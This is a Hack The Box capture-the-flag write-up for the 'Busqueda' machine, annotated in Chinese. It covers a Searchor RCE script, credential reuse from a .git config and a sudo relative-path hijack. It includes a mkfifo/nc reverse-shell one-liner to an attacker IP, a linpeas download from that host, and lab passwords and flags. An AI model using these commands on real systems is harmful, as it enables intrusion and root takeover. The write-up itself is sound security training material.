###### tags: `Hack the box` `HTB` `Easy`

# Busqueda
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.228.217 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.228.217:22
Open 10.129.228.217:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
|   256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
80/tcp open  http    syn-ack Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

修改domain，前往`http://searcher.htb/`
```
┌──(kali㉿kali)-[~/htb]
└─$ sudo nano /etc/hosts

10.129.228.217  searcher.htb
```

搜尋[Searchor_2.4.0_RCE_Python](https://github.com/twisted007/Searchor_2.4.0_RCE_Python)
```
┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp80

┌──(kali㉿kali)-[~/htb/Searchor_2.4.0_RCE_Python]
└─$ python3 searchor-2_4_0_RCE.py searcher.htb 10.10.14.65 80
```

等反彈，在`/home/svc/`得user.txt
```
python3 -c 'import pty; pty.spawn("/bin/bash")'

svc@busqueda:~$ cat user.txt
855e9785bae6cf4a5211feead461df10
```

linpeas
```
svc@busqueda:/tmp$ wget 10.10.14.65:21/linpeas.sh
svc@busqueda:/tmp$ chmod +x linpeas.sh
svc@busqueda:/tmp$ ./linpeas.sh

-rw-rw-r-- 1 svc svc 76 Apr  3  2023 /home/svc/.gitconfig
[user]
        email = cody@searcher.htb
        name = cody
[core]
        hooksPath = no-hooks


drwxr-xr-x 8 www-data www-data 4096 May 23 07:02 /var/www/app/.git
```

查看`/var/www/app/.git/config`
```
svc@busqueda:/var/www/app/.git$ cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main

```

把`gitea.searcher.htb`加進來
```
┌──(kali㉿kali)-[~/htb]
└─$ sudo nano /etc/hosts

10.129.228.217  gitea.searcher.htb
```

可以透過`sudo -l`查看，密碼用`jh1usoih2bkjaspwe92`
```
svc@busqueda:/var/www/app/.git$ sudo -l
[sudo] password for svc: jh1usoih2bkjaspwe92
                         jh1usoih2bkjaspwe92

Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

執行看看
```
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py * 
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
     
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS          PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   16 months ago   Up 50 minutes   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   16 months ago   Up 50 minutes   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

參考[docker inspect](https://docs.docker.com/reference/cli/docker/inspect/)
```
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect json gitea | jq

svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq                           sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
<m-checkup.py docker-inspect '{{json .}}' gitea | jq
[sudo] password for svc: jh1usoih2bkjaspwe92
                         jh1usoih2bkjaspwe92

{
  "Id": "960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb",
  "Created": "2023-01-06T17:26:54.457090149Z",
  "Path": "/usr/bin/entrypoint",
  "Args": [
    "/bin/s6-svscan",
    "/etc/s6"
  ],
  "State": {
    "Status": "running",
    "Running": true,
    "Paused": false,
    "Restarting": false,
    "OOMKilled": false,
    "Dead": false,
    "Pid": 1780,
    "ExitCode": 0,
    "Error": "",
    "StartedAt": "2024-05-23T07:02:29.289048266Z",
    "FinishedAt": "2023-04-04T17:03:01.71746837Z"
  },
  "Image": "sha256:6cd4959e1db11e85d89108b74db07e2a96bbb5c4eb3aa97580e65a8153ebcc78",
  "ResolvConfPath": "/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/resolv.conf",
  "HostnamePath": "/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/hostname",
  "HostsPath": "/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/hosts",
  "LogPath": "/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb-json.log",                                                                                                   
  "Name": "/gitea",
  "RestartCount": 0,
  "Driver": "overlay2",
  "Platform": "linux",
  "MountLabel": "",
  "ProcessLabel": "",
  "AppArmorProfile": "docker-default",
  "ExecIDs": null,
  "HostConfig": {
    "Binds": [
      "/etc/timezone:/etc/timezone:ro",
      "/etc/localtime:/etc/localtime:ro",
      "/root/scripts/docker/gitea:/data:rw"
    ],
    "ContainerIDFile": "",
    "LogConfig": {
      "Type": "json-file",
      "Config": {}
    },
    "NetworkMode": "docker_gitea",
    "PortBindings": {
      "22/tcp": [
        {
          "HostIp": "127.0.0.1",
          "HostPort": "222"
        }
      ],
      "3000/tcp": [
        {
          "HostIp": "127.0.0.1",
          "HostPort": "3000"
        }
      ]
    },
    "RestartPolicy": {
      "Name": "always",
      "MaximumRetryCount": 0
    },
    "AutoRemove": false,
    "VolumeDriver": "",
    "VolumesFrom": [],
    "CapAdd": null,
    "CapDrop": null,
    "CgroupnsMode": "private",
    "Dns": [],
    "DnsOptions": [],
    "DnsSearch": [],
    "ExtraHosts": null,
    "GroupAdd": null,
    "IpcMode": "private",
    "Cgroup": "",
    "Links": null,
    "OomScoreAdj": 0,
    "PidMode": "",
    "Privileged": false,
    "PublishAllPorts": false,
    "ReadonlyRootfs": false,
    "SecurityOpt": null,
    "UTSMode": "",
    "UsernsMode": "",
    "ShmSize": 67108864,
    "Runtime": "runc",
    "ConsoleSize": [
      0,
      0
    ],
    "Isolation": "",
    "CpuShares": 0,
    "Memory": 0,
    "NanoCpus": 0,
    "CgroupParent": "",
    "BlkioWeight": 0,
    "BlkioWeightDevice": null,
    "BlkioDeviceReadBps": null,
    "BlkioDeviceWriteBps": null,
    "BlkioDeviceReadIOps": null,
    "BlkioDeviceWriteIOps": null,
    "CpuPeriod": 0,
    "CpuQuota": 0,
    "CpuRealtimePeriod": 0,
    "CpuRealtimeRuntime": 0,
    "CpusetCpus": "",
    "CpusetMems": "",
    "Devices": null,
    "DeviceCgroupRules": null,
    "DeviceRequests": null,
    "KernelMemory": 0,
    "KernelMemoryTCP": 0,
    "MemoryReservation": 0,
    "MemorySwap": 0,
    "MemorySwappiness": null,
    "OomKillDisable": null,
    "PidsLimit": null,
    "Ulimits": null,
    "CpuCount": 0,
    "CpuPercent": 0,
    "IOMaximumIOps": 0,
    "IOMaximumBandwidth": 0,
    "MaskedPaths": [
      "/proc/asound",
      "/proc/acpi",
      "/proc/kcore",
      "/proc/keys",
      "/proc/latency_stats",
      "/proc/timer_list",
      "/proc/timer_stats",
      "/proc/sched_debug",
      "/proc/scsi",
      "/sys/firmware"
    ],
    "ReadonlyPaths": [
      "/proc/bus",
      "/proc/fs",
      "/proc/irq",
      "/proc/sys",
      "/proc/sysrq-trigger"
    ]
  },
  "GraphDriver": {
    "Data": {
      "LowerDir": "/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34-init/diff:/var/lib/docker/overlay2/bd9193f562680204dc7c46c300e3410c51a1617811a43c97dffc9c3ee6b6b1b8/diff:/var/lib/docker/overlay2/df299917c1b8b211d36ab079a37a210326c9118be26566b07944ceb4342d3716/diff:/var/lib/docker/overlay2/50fb3b75789bf3c16c94f888a75df2691166dd9f503abeadabbc3aa808b84371/diff:/var/lib/docker/overlay2/3668660dd8ccd90774d7f567d0b63cef20cccebe11aaa21253da056a944aab22/diff:/var/lib/docker/overlay2/a5ca101c0f3a1900d4978769b9d791980a73175498cbdd47417ac4305dabb974/diff:/var/lib/docker/overlay2/aac5470669f77f5af7ad93c63b098785f70628cf8b47ac74db039aa3900a1905/diff:/var/lib/docker/overlay2/ef2d799b8fba566ee84a45a0070a1cf197cd9b6be58f38ee2bd7394bb7ca6560/diff:/var/lib/docker/overlay2/d45da5f3ac6633ab90762d7eeac53b0b83debef94e467aebed6171acca3dbc39/diff",                                                                                                    
      "MergedDir": "/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34/merged",
      "UpperDir": "/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34/diff",
      "WorkDir": "/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34/work"
    },
    "Name": "overlay2"
  },
  "Mounts": [
    {
      "Type": "bind",
      "Source": "/etc/timezone",
      "Destination": "/etc/timezone",
      "Mode": "ro",
      "RW": false,
      "Propagation": "rprivate"
    },
    {
      "Type": "bind",
      "Source": "/root/scripts/docker/gitea",
      "Destination": "/data",
      "Mode": "rw",
      "RW": true,
      "Propagation": "rprivate"
    },
    {
      "Type": "bind",
      "Source": "/etc/localtime",
      "Destination": "/etc/localtime",
      "Mode": "ro",
      "RW": false,
      "Propagation": "rprivate"
    }
  ],
  "Config": {
    "Hostname": "960873171e2e",
    "Domainname": "",
    "User": "",
    "AttachStdin": false,
    "AttachStdout": false,
    "AttachStderr": false,
    "ExposedPorts": {
      "22/tcp": {},
      "3000/tcp": {}
    },
    "Tty": false,
    "OpenStdin": false,
    "StdinOnce": false,
    "Env": [
      "USER_UID=115",
      "USER_GID=121",
      "GITEA__database__DB_TYPE=mysql",
      "GITEA__database__HOST=db:3306",
      "GITEA__database__NAME=gitea",
      "GITEA__database__USER=gitea",
      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
...
```

可以得到mysql的帳號密碼，但同時也可以登入gitea
用`administrator/yuiu1hoiu4i5ho1uh`登入，查看
前往`http://gitea.searcher.htb/administrator/scripts/src/branch/main/system-checkup.py`

執行`sudo /usr/bin/python3 /opt/scripts/system-checkup.py`後面會接一個`full-checkup.sh`
```
...
elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
...
```

建立一個bash檔，到`/tmp`執行
```
## full-checkup.sh
echo -en "#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.65 9001 >/tmp/f" > /tmp/full-checkup.sh

┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp9001

svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

等反彈後在/root得root.txt
```
# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@busqueda:/tmp# cd /root
root@busqueda:~# cat root.txt
59aae04125f49328dad4130c2c899ee6
```
